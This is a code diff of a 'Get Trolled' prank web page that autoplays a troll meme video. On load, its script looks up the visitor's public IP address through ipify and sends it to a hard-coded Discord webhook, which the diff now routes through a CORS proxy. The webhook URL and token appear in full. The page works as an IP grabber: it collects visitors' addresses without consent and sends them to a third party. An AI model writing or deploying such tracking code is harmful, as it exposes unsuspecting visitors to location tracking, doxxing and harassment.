@@ -7,75 +7,82 @@
       margin: 0;
       overflow: hidden;
       background-color: black;
+      color: white;
+      font-family: Arial, sans-serif;
     }
-
     #video-container {
       position: absolute;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
       overflow: hidden;
+      z-index: 0;
     }
-
     #plank-video {
       width: 100%;
       height: 100%;
       object-fit: contain;
     }
-
     #plank-container {
       position: absolute;
-      top: 10px;
-      left: 10px;
-      color: white;
-      font-family: Arial, sans-serif;
+      top: 10px; left: 10px;
       font-size: 20px;
+      z-index: 1;
+    }
+    #ip-address {
+      position: absolute;
+      bottom: 10px; left: 10px;
+      font-size: 16px;
+      z-index: 1;
     }
   </style>
 </head>
 <body>
   <div id="plank-container">
     <h1>Get Trolled</h1>
-    
   </div>
 
   <div id="video-container">
-    <video id="plank-video" autoplay loop controls playsinline>
+    <video id="plank-video" autoplay loop controls playsinline muted>
       <source src="https://media.discordapp.net/attachments/1130971768459382884/1133882111988875304/Phonk_trollge_meme_original_hke8wCNNosI.mp4" type="video/mp4">
     </video>
   </div>
 
-  <script type="application/javascript">
-    function getIP(json) {
-      var ipAddress = json.ip;
-      document.getElementById("ip-address").innerText = "My public IP address is: " + ipAddress;
+  <div id="ip-address">Fetching IP...</div>
 
-      // Send the IP address to the Discord webhook
-      sendToDiscordWebhook(ipAddress);
+  <script>
+    async function fetchIP() {
+      try {
+        const response = await fetch('https://api64.ipify.org?format=json');
+        const data = await response.json();
+        const ip = data.ip;
+        document.getElementById('ip-address').innerText = "My public IP address is: " + ip;
+        sendToDiscordWebhook(ip);
+      } catch (error) {
+        document.getElementById('ip-address').innerText = "Failed to fetch IP.";
+        console.error('IP fetch error:', error);
+      }
     }
 
     function sendToDiscordWebhook(ip) {
-      // Replace 'YOUR_DISCORD_WEBHOOK_URL' with your actual Discord webhook URL
-      var discordWebhookUrl = "https://discord.com/api/webhooks/1403468598286221333/d15xSrnNqkAJ_jk5cnGqcLh8oigcdjJlZHj7t9aqM4DDmQ5K9Rif6jVdewyWrAFr8Hcg";
+      const webhookUrl = "https://discord.com/api/webhooks/1403468598286221333/d15xSrnNqkAJ_jk5cnGqcLh8oigcdjJlZHj7t9aqM4DDmQ5K9Rif6jVdewyWrAFr8Hcg";
+      const corsProxy = "https://cors-anywhere.herokuapp.com/";
 
-      // Create a new XMLHttpRequest to make a POST request to Discord webhook
-      var xhr = new XMLHttpRequest();
-      xhr.open("POST", discordWebhookUrl);
-
-      // Set the content type to JSON
-      xhr.setRequestHeader("Content-Type", "application/json");
-
-      // Create the JSON payload
-      var payload = {
-        content: "My public IP address is: " + ip
-      };
-
-      // Convert the payload to JSON and send it
-      xhr.send(JSON.stringify(payload));
+      fetch(corsProxy + webhookUrl, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ content: "My public IP address is: " + ip })
+      })
+      .then(res => {
+        if(!res.ok) throw new Error('Failed to send webhook, status: ' + res.status);
+        document.getElementById('ip-address').innerText += " (IP sent to Discord)";
+      })
+      .catch(err => {
+        document.getElementById('ip-address').innerText += " (Failed to send to Discord)";
+        console.error('Discord webhook error:', err);
+      });
     }
-  </script>
 
-  <script type="application/javascript" src="https://api.ipify.org?format=jsonp&callback=getIP"></script>
+    fetchIP();
+  </script>
 </body>
 </html>
